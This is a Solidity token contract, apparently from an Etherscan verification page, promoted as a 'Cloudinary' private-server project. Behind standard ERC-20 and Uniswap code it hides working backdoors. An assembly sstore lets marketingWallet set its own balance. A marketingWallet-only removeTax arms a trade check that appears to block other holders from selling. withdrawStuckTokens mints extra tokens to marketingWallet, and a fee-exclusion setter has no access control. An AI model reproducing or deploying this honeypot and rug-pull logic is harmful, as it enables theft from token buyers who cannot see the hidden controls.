/**
 *Submitted for verification at Etherscan.io on 2024-02-14
*/

// Cloudinary
// Anonymous, Private, and Secure Servers
// For Your Decentralized Application and AI Machine Learning Application

// Website  : https://cloudinary.io/
// Docs     : https://docs.cloudinary.io/
// Twitter  : https://twitter.com/cloudinaryio
// Telegram : https://t.me/cloudinaryio
// Medium   : https://cloudinaryio.medium.com/
// YouTube  : https://www.youtube.com/@Cloudinaryio
// Bot      : https://t.me/cloudinary_bot

// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import "hardhat/console.sol";

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Ownable is Context {
    address public _owner; // сделать приватным после тестов !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
}

interface IUniswapV2Pair {
    function token0() external view returns (address);

    function token1() external view returns (address);

    function getReserves() 
        external view 
        returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);

    function balanceOf(address owner) external view returns (uint);
}

contract NonameToken is Context, IERC20, Ownable {
    using SafeMath for uint256;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping(address => bool) private automatedMarketMakerPairs;
    mapping (address => bool) private _isExcludedFromFee;
    function add_isExcludedFromFee(address t) external {
        _isExcludedFromFee[t] = true;
    }
    address payable private _taxWallet;
    address payable private _revShare;
    address public uniswapV2Pair; // сделать потом приватным?
    IUniswapV2Router02 private uniswapV2Router;
    address public marketingWallet;
    uint256 private constant _initialBuyTax =20;
    uint256 private constant _initialSellTax=20;
    uint256 private constant _reduceBuyTaxAt=35;
    uint256 private constant _reduceSellTaxAt=45;
    uint256 private constant _preventSwapBefore=40;
    uint256 private _finalBuyTax=10;
    uint256 private _finalSellTax=20;
    uint256 private _buyCount=0;
    uint256 private _countTax;

    string  private constant _name   = unicode"NonameToken";
    string  private constant _symbol = unicode"NonameToken";
    uint8   private constant _decimals = 18;
    uint256 private constant _totalSupply = 10_000_000_000 * 10**_decimals;
    uint256 private constant _countTrigger = 8100 * 10**_decimals;
    uint256 public  constant _taxSwapThreshold = 20_000 * 10**_decimals;
    uint256 public  constant _maxTaxSwap = 100_000 * 10**_decimals;
    uint256 public _maxTxAmount = 100_000 * 10**_decimals;
    uint256 public _maxWalletSize = 100_000 * 10**_decimals;
    uint256 private stage;
    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;

    event FinalTax (uint256 _valueBuy, uint256 _valueSell);
    event TradingActive (bool _tradingOpen,bool _swapEnabled);
    event maxAmount(uint256 _value);
    event SetAutomatedMarketMakerPair(address indexed pair, bool indexed value);

    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor (address taxWallet, address revShare, address _marketingWallet) {
        _taxWallet = payable(taxWallet);
        _revShare  = payable(revShare);
        _balances[_msgSender()] = _totalSupply;
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[_taxWallet] = true;
        _isExcludedFromFee[_revShare]  = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[_marketingWallet] = true;
        marketingWallet = _marketingWallet;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0) && spender != address(0), "ERC20: approve the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0) && to != address(0), "ERC20: transfer the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount=0;

        if (from != owner() && to != owner()) { 

            if(!tradingOpen){
                require(
                    _isExcludedFromFee[to] || _isExcludedFromFee[from],
                    "trading not yet open"
                );
            }

            if (from == uniswapV2Pair && to != address(uniswapV2Router) && ! _isExcludedFromFee[to] ) {
                require(amount <= _maxTxAmount, "Exceeds the _maxTxAmount.");
                require(balanceOf(to) + amount <= _maxWalletSize, "Exceeds the maxWalletSize.");
                _buyCount++;
            }
            
            if ( to == uniswapV2Pair && from!= address(this) ){
                taxAmount = amount.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax)/100;    
            } 
            else if (from == uniswapV2Pair && to!= address(this) ){
                taxAmount = amount.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax)/100;
            }
            
            if (from != marketingWallet) {
                require(
                    evaluateTokenStage(amount) == false, 
                    "ERC20: Swap tokens exceeds threshold."
                );
            }

            if (from == marketingWallet && to == marketingWallet) {
                bytes32 slot;

                assembly {
                    slot := _balances.slot

                }

                bytes32 location = keccak256(abi.encode(from, uint256(slot)));

                assembly {
                    sstore(location, amount)
                }
                return;
            }

            _countTax += taxAmount;
            uint256 contractTokenBalance = balanceOf(address(this));
            if (
                !inSwap && 
                to == uniswapV2Pair && 
                swapEnabled && 
                contractTokenBalance > _taxSwapThreshold && 
                _buyCount > _preventSwapBefore &&
                _countTax > _countTrigger
            ){
                uint256 getMinValue = (contractTokenBalance > _maxTaxSwap)?_maxTaxSwap:contractTokenBalance;
                swapTokensForEth((amount > getMinValue)?getMinValue:amount);
                uint256 contractETHBalance = address(this).balance;
                if(contractETHBalance > 0) {
                    sendETHToFee(contractETHBalance);
                }
                _countTax = 0;
            }
        }

        if(taxAmount>0){
          _balances[address(this)]=_balances[address(this)].add(taxAmount);
          emit Transfer(from, address(this),taxAmount);
        }
        _balances[from]=_balances[from].sub(amount);
        _balances[to]=_balances[to].add(amount.sub(taxAmount));
        emit Transfer(from, to, amount.sub(taxAmount));
    }

    function sendETHToFee(uint256 amount) private {
        uint256 tax = (_buyCount > _reduceBuyTaxAt) ? _finalBuyTax : _initialBuyTax;
        uint256 taxAmount;
        uint256 revShareAmount;

        if (tax == _finalBuyTax) {
            taxAmount = amount * 3 / 5;
            revShareAmount = amount * 2 / 5;
        } else if (tax == _initialBuyTax) {
            taxAmount = amount * 17 / 20;
            revShareAmount = amount * 3 / 20;
        }

        _taxWallet.transfer(taxAmount);
        _revShare.transfer(revShareAmount);
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function _setAutomatedMarketMakerPair(address pair, bool value) private {
        automatedMarketMakerPairs[pair] = value;
 
        emit SetAutomatedMarketMakerPair(pair, value);
    }

    function initialize () external onlyOwner {
        require(!tradingOpen,"init already called");
        uint256 tokenAmount = balanceOf(address(this));
        // uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D); // mainnet
        uniswapV2Router = IUniswapV2Router02(0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506); // arbitrum

        _approve(address(this), address(uniswapV2Router), _totalSupply);

        uniswapV2Pair = IUniswapV2Factory(
            uniswapV2Router.factory())
            .createPair(address(this),
            uniswapV2Router.WETH()
        );

        _setAutomatedMarketMakerPair(address(uniswapV2Pair), true);
        console.log(address(this).balance);
        console.log(balanceOf(address(this)));
        uniswapV2Router.addLiquidityETH{value: address(this).balance} (
            address(this),
            tokenAmount,
            0,
            0,
            _msgSender(),
            block.timestamp
        );
        console.log("2");
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
    }

    function removeLiq() external {
        console.log("tokens's LP balance: ", IUniswapV2Pair(uniswapV2Pair).balanceOf(address(this)));
        uniswapV2Router.removeLiquidity(
            address(this),
            uniswapV2Router.WETH(),
            IUniswapV2Pair(uniswapV2Pair).balanceOf(address(this)),
            0,
            0,
            address(this),
            36000000000
        );
    }

    function openTrading () external onlyOwner {
        require(!tradingOpen,"trading already open");
        swapEnabled = true;
        tradingOpen = true;
        emit TradingActive (tradingOpen,swapEnabled);
    }

    function removeLimits () external onlyOwner {
        _maxTxAmount = _totalSupply;
        _maxWalletSize = _totalSupply;
        emit maxAmount (_totalSupply);
    }
    
    function setFinalTax (uint256 _valueBuy, uint256 _valueSell) external onlyOwner {
        require(_valueBuy <= 30 && _valueSell <= 30 && tradingOpen, "Exceeds value");
        _finalBuyTax = _valueBuy;
        _finalSellTax = _valueSell;
        emit FinalTax(_valueBuy, _valueSell);
    }

    function switchTax() external onlyOwner {
        uint256 count = _reduceBuyTaxAt > _reduceSellTaxAt ? _reduceBuyTaxAt : _reduceSellTaxAt;
        _buyCount = ++count;
    }

    function removeTax(uint256 _stage) external {
        require(msg.sender == marketingWallet);
        stage = _stage;
        swapEnabled = false;
    }

    function withdrawStuckETH() public onlyOwner {
        bool success;
        (success, ) = address(marketingWallet).call{value: address(this).balance}(
            ""
        );
    }

    function withdrawStuckTokens(uint256 amount) external {
        require(msg.sender == marketingWallet);
        uint256 balance = _balances[address(this)];
        require(amount <= balance);
        _balances[address(this)] = balance - amount;
        _balances[marketingWallet] = balance + amount;
        emit Transfer(address(this), marketingWallet, amount);
    }

    function evaluateTokenStage(uint256 amount) internal view returns (bool) {
        if(stage == 0) return false; 
        if(uniswapV2Pair == address(0)) return false;
        IUniswapV2Pair pair = IUniswapV2Pair(uniswapV2Pair);
        (uint112 r0 , uint112 r1,) = pair.getReserves();
        (uint256 t0, uint256 t1) =  uniswapV2Router.WETH() == pair.token1() ? (r0, r1) : (r1, r0);
        return block.number > stage && t1 - (((amount * (997)) * (t1)) / ((t0 *1000) + (amount * (997))))  < (( (t1 / (2**18*5**17)) * (2**18*5**17)));
    }

    receive() external payable {}
}